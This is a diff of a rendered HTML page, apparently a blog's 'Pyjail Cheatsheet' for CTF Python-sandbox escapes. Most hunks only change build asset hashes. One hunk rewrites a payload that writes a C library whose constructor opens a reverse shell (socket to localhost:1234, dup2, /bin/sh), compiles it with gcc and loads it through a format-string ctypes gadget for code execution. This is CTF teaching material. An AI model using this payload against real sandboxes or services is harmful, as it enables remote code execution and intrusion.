@@ -27,13 +27,13 @@
     <meta http-equiv="content-security-policy" content=""><title>Pyjail Cheatsheet</title><meta property="og:title" content="Pyjail Cheatsheet" data-svelte="svelte-15w3rt">
 	<link href="/_app/immutable/assets/__layout-58a37c92.css" rel="stylesheet">
 	<link href="/_app/immutable/assets/layout-5b9c754d.css" rel="stylesheet">
-	<link rel="modulepreload" href="/_app/immutable/start-f63836a6.js">
+	<link rel="modulepreload" href="/_app/immutable/start-80b2c88b.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-f2a82808.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-36b86faa.js">
 	<link rel="modulepreload" href="/_app/immutable/pages/__layout.svelte-e154bb9b.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/stores-1686c5b9.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-57d47233.js">
-	<link rel="modulepreload" href="/_app/immutable/pages/blog/pyjail-cheatsheet.md-14e5f6da.js">
+	<link rel="modulepreload" href="/_app/immutable/pages/blog/pyjail-cheatsheet.md-74b9000f.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/layout-d6e193e1.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/utils-e126d158.js">
   </head>
@@ -372,7 +372,7 @@ user <span class="token operator">=</span> User<span class="token punctuation">(
 <span class="token comment"># - https://yun.ng/c/ctf/2025-uoft-ctf/web/prepared</span>
 
 <span class="token comment"># essentially, write .so / .dll file to system first and then load it as a c library for RCE</span>
-<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/lib.c"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token triple-quoted-string string">b"""#include &lt;stdlib.h>&#92;n__attribute__((constructor))&#92;nvoid init() &#123;&#92;nsystem("python3 -c \\\"import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('localhost', 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system('/bin/sh')\\\"");&#92;n&#125;"""</span><span class="token punctuation">)</span>
+<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/lib.c"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token triple-quoted-string string">b"""#include &lt;stdlib.h>&#92;n__attribute__((constructor))&#92;nvoid init() &#123;&#92;nsystem("python3 -c \\"import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('localhost', 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system('/bin/sh')\\"");&#92;n&#125;"""</span><span class="token punctuation">)</span>
 os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"gcc -shared -fPIC /tmp/lib.c -o lib.so"</span><span class="token punctuation">)</span>
 
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
@@ -404,9 +404,6 @@ os<span class="token punctuation">.</span>system<span class="token punctuation">
 <li><code>class instances</code>:<ul class="list"><li><code>class cobj:...</code><ul class="list"><li><code>obj = cobj()</code></li></ul></li>
 <li><code>type(&quot;cobj&quot;, (object,), {})()</code><ul class="list"><li><code>[].__class__.__class__(&quot;cobj&quot;, [].__class__.__bases__.__class__([[].__class__.__base__]), {})()</code></li></ul></li></ul></li></ul>
 <h2 id="ctf"><a href="#ctf">CTF</a></h2>
-<h3 id><a href="#"></a></h3>
-<ul class="list"><li><code>jail.py</code></li></ul>
-<pre class="language-py"><!-- HTML_TAG_START --><code class="language-py">https<span class="token punctuation">:</span><span class="token operator">//</span>ctf<span class="token punctuation">.</span>gg<span class="token operator">/</span>blog<span class="token operator">/</span>buckeyectf<span class="token operator">-</span><span class="token number">2024</span><span class="token operator">/</span>gentleman</code><!-- HTML_TAG_END --></pre>
 <h3 id="seccon-ctf-13-1linepyjail"><a href="#seccon-ctf-13-1linepyjail">SECCON CTF 13: 1linepyjail</a></h3>
 <ul class="list"><li><code>jail.py</code></li></ul>
 <pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code <span class="token operator">:=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"jail> "</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">100</span> <span class="token keyword">and</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fullmatch<span class="token punctuation">(</span><span class="token string">r'([^()]|())*'</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">":("</span><span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
@@ -1815,13 +1812,13 @@ inp <span class="token operator">=</span> <span class="token builtin">input</spa
 </footer>
 
 
-		<script type="module" data-sveltekit-hydrate="1wyxjnz">
-		import { set_public_env, start } from "/_app/immutable/start-f63836a6.js";
+		<script type="module" data-sveltekit-hydrate="moniri">
+		import { set_public_env, start } from "/_app/immutable/start-80b2c88b.js";
 
 		set_public_env({});
 
 		start({
-			target: document.querySelector('[data-sveltekit-hydrate="1wyxjnz"]').parentNode,
+			target: document.querySelector('[data-sveltekit-hydrate="moniri"]').parentNode,
 			paths: {"base":"","assets":""},
 			session: {},
 			route: true,
